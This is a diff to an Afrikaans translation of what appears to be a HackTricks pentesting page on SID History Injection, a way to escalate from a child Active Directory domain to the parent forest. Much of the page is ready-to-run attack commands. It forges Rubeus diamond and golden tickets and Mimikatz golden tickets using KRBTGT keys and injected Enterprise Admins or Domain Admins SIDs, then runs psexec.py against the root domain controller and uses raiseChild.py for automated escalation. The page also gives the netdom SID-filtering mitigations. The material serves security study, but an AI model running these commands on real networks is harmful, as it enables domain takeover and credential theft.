@@ -4,15 +4,15 @@
 
 ## SID History Injection Attack
 
-Die fokus van die **SID History Injection Attack** is om **user migration between domains** te ondersteun, terwyl voortgesette toegang tot hulpbronne van die voormalige domain verseker word. Dit word bereik deur die gebruiker se vorige Security Identifier (SID) by die SID History van hul nuwe rekening in te sluit. Hierdie proses kan egter gemanipuleer word om unauthorized access toe te staan deur die SID van ’n groep met hoë privileges (soos Enterprise Admins of Domain Admins) van die parent domain by die SID History te voeg. Hierdie uitbuiting verleen toegang tot alle hulpbronne binne die parent domain.<sup>[[1]](#references)[[2]](#references)</sup>
+Die fokus van die **SID History Injection Attack** is om **user migration between domains** te ondersteun terwyl voortgesette toegang tot hulpbronne vanaf die voormalige domein verseker word. Dit word bereik deur die gebruiker se vorige Security Identifier (SID) by die SID History van hul nuwe account in te sluit. Hierdie proses kan egter gemanipuleer word om ongemagtigde toegang toe te staan deur die SID van ’n groep met hoë privileges (soos Enterprise Admins of Domain Admins) vanaf die ouerdomein by die SID History te voeg. Hierdie uitbuiting verleen toegang tot alle hulpbronne binne die ouerdomein.<sup>[[1]](#references)[[2]](#references)</sup>
 
 Twee metodes bestaan om hierdie aanval uit te voer: deur óf ’n **Golden Ticket** óf ’n **Diamond Ticket** te skep.
 
-Om die SID vir die **"Enterprise Admins"**-groep te bepaal, moet ’n mens eers die SID van die root domain vind. Nadat dit geïdentifiseer is, kan die Enterprise Admins-groep se SID saamgestel word deur `-519` by die root domain se SID te voeg. Byvoorbeeld, indien die root domain se SID `S-1-5-21-280534878-1496970234-700767426` is, sal die resulterende SID vir die "Enterprise Admins"-groep `S-1-5-21-280534878-1496970234-700767426-519` wees.<sup>[[1]](#references)</sup>
+Om die SID vir die **"Enterprise Admins"**-groep te bepaal, moet ’n mens eers die SID van die worteldomein vind. Nadat dit geïdentifiseer is, kan die Enterprise Admins-groep se SID saamgestel word deur `-519` aan die worteldomein se SID te voeg. Byvoorbeeld, as die worteldomein se SID `S-1-5-21-280534878-1496970234-700767426` is, sal die resulterende SID vir die "Enterprise Admins"-groep `S-1-5-21-280534878-1496970234-700767426-519` wees.<sup>[[1]](#references)</sup>
 
-Jy kan ook die **Domain Admins**-groepe gebruik, wat op **512** eindig.
+Jy kan ook die **Domain Admins**-groepe gebruik, wat met **512** eindig.
 
-Nog ’n manier om die SID van ’n groep in die ander domain (byvoorbeeld "Domain Admins") te vind, is met:
+Nog ’n manier om die SID van ’n groep in die ander domein (byvoorbeeld "Domain Admins") te vind, is met:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
@@ -20,15 +20,15 @@ Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSi
 > Let daarop dat dit moontlik is om SID history in ’n trust relationship te deaktiveer, wat sal veroorsaak dat hierdie aanval misluk.
 
 Volgens die [**docs**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
-- **Deaktiveer SIDHistory op forest trusts** deur die netdom-tool te gebruik (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
-- **Pas SID Filter Quarantining op external trusts toe** deur die netdom-tool te gebruik (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Die toepassing van SID Filtering op domain trusts binne ’n enkele forest** word nie aanbeveel nie, aangesien dit ’n nie-ondersteunde konfigurasie is en breaking changes kan veroorsaak. As ’n domain binne ’n forest onbetroubaar is, behoort dit nie ’n lid van die forest te wees nie. In hierdie situasie is dit eers nodig om die trusted en untrusted domains in afsonderlike forests te verdeel, waar SID Filtering op ’n interforest trust toegepas kan word.
+- **Deaktiveer SIDHistory op forest trusts** met die netdom-tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Pas SID Filter Quarantining op external trusts toe** met die netdom-tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Die toepassing van SID Filtering op domain trusts binne ’n enkele forest** word nie aanbeveel nie, aangesien dit ’n unsupported configuration is en breaking changes kan veroorsaak. As ’n domain binne ’n forest onbetroubaar is, behoort dit nie ’n lid van die forest te wees nie. In hierdie situasie moet die trusted en untrusted domains eers in afsonderlike forests verdeel word, waarna SID Filtering op ’n interforest trust toegepas kan word.
 
-Lees hierdie post vir meer inligting oor hoe om dit te omseil: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Kyk na hierdie post vir meer inligting oor hoe om dit te bypass: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-Die laaste keer toe ek dit probeer het, moes ek die arg **`/ldap`** byvoeg.
+Die laaste keer wat ek dit probeer het, moes ek die arg **`/ldap`** byvoeg.
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -44,7 +44,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-### Golden Ticket (Mimikatz) met KRBTGT-AES256
+### Golden Ticket (Mimikatz) with KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -121,21 +121,21 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Outomaties met behulp van [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Outomaties met [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Dit is 'n Impacket-script wat **die eskalering van die kinderdomein na die ouerdomein outomatiseer**. Die script benodig:
+Dit is ’n Impacket-script wat die **eskalering van die kinderdomein na die ouerdomein outomatiseer**. Die script benodig:
 
 - Teikendomeinbeheerder
-- Creds vir 'n admin-gebruiker in die kinderdomein
+- Aanmeldbesonderhede vir ’n admin-gebruiker in die kinderdomein
 
-Die proses is:
+Die vloei is:
 
 - Verkry die SID vir die Enterprise Admins-groep van die ouerdomein
 - Haal die hash vir die KRBTGT-rekening in die kinderdomein op
-- Skep 'n Golden Ticket
-- Meld aan by die ouerdomein
-- Haal credentials vir die Administrator-rekening in die ouerdomein op
-- Indien die `target-exec`-skakelaar gespesifiseer word, autentiseer dit teen die ouerdomein se Domain Controller via Psexec.
+- Skep ’n Golden Ticket
+- Meld by die ouerdomein aan
+- Haal aanmeldbesonderhede vir die Administrator-rekening in die ouerdomein op
+- As die `target-exec`-switch gespesifiseer word, autentiseer dit by die ouerdomein se Domain Controller via Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
@@ -144,5 +144,6 @@ raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 - [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
 - [2] [What is Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 - [3] [Security Considerations for Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [4] [itm8.com - Sid Filter As Security Boundary Between Domains Part 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 {{#include ../../banners/hacktricks-training.md}}
